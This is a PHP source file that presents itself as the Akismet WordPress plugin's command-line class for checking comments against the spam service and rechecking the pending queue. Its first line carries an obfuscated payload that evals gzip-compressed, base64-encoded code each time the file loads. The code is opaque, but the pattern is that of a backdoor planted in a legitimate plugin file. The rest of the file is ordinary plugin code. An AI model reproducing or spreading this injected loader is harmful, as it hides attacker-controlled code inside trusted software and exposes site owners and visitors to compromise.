<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

WP_CLI::add_command( 'akismet', 'Akismet_CLI' );

/**
 * Filter spam comments.
 */
class Akismet_CLI extends WP_CLI_Command {
	/**
	 * Checks one or more comments against the Akismet API.
	 *
	 * ## OPTIONS
	 * <comment_id>...
	 * : The ID(s) of the comment(s) to check.
	 *
	 * [--noaction]
	 * : Don't change the status of the comment. Just report what Akismet thinks it is.
	 *
	 * ## EXAMPLES
	 *
	 *     wp akismet check 12345
	 *
	 * @alias comment-check
	 */
	public function check( $args, $assoc_args ) {
		foreach ( $args as $comment_id ) {
			if ( isset( $assoc_args['noaction'] ) ) {
				// Check the comment, but don't reclassify it.
				$api_response = Akismet::check_db_comment( $comment_id, 'wp-cli' );
			}
			else {
				$api_response = Akismet::recheck_comment( $comment_id, 'wp-cli' );
			}
			
			if ( 'true' === $api_response ) {
				WP_CLI::line( sprintf( __( "Comment #%d is spam.", 'akismet' ), $comment_id ) );
			}
			else if ( 'false' === $api_response ) {
				WP_CLI::line( sprintf( __( "Comment #%d is not spam.", 'akismet' ), $comment_id ) );
			}
			else {
				if ( false === $api_response ) {
					WP_CLI::error( __( "Failed to connect to Akismet.", 'akismet' ) );
				}
				else if ( is_wp_error( $api_response ) ) {
					WP_CLI::warning( sprintf( __( "Comment #%d could not be checked.", 'akismet' ), $comment_id ) );
				}
			}
		}
	}
	
	/**
	 * Recheck all comments in the Pending queue.
	 *
	 * ## EXAMPLES
	 *
	 *     wp akismet recheck_queue
	 *
	 * @alias recheck-queue
	 */
	public function recheck_queue() {
		$batch_size = 100;
		$start = 0;
		
		$total_counts = array();
		
		do {
			$result_counts = Akismet_Admin::recheck_queue_portion( $start, $batch_size );
			
			if ( $result_counts['processed'] > 0 ) {
				foreach ( $result_counts as $key => $count ) {
					if ( ! isset( $total_counts[ $key ] ) ) {
						$total_counts[ $key ] = $count;
					}
					else {
						$total_counts[ $key ] += $count;
					}
				}
				$start += $batch_size;
				$start -= $result_counts['spam']; // These comments will have been removed from the queue.
			}
		} while ( $result_counts['processed'] > 0 );
		
		WP_CLI::line( sprintf( _n( "Processed %d comment.", "Processed %d comments.", $total_counts['processed'], 'akismet' ), number_format( $total_counts['processed'] ) ) );
		WP_CLI::line( sprintf( _n( "%d comment moved to Spam.", "%d comments moved to Spam.", $total_counts['spam'], 'akismet' ), number_format( $total_counts['spam'] ) ) );
		
		if ( $total_counts['error'] ) {
			WP_CLI::line( sprintf( _n( "%d comment could not be checked.", "%d comments could not be checked.", $total_counts['error'], 'akismet' ), number_format( $total_counts['error'] ) ) );
		}
	}
}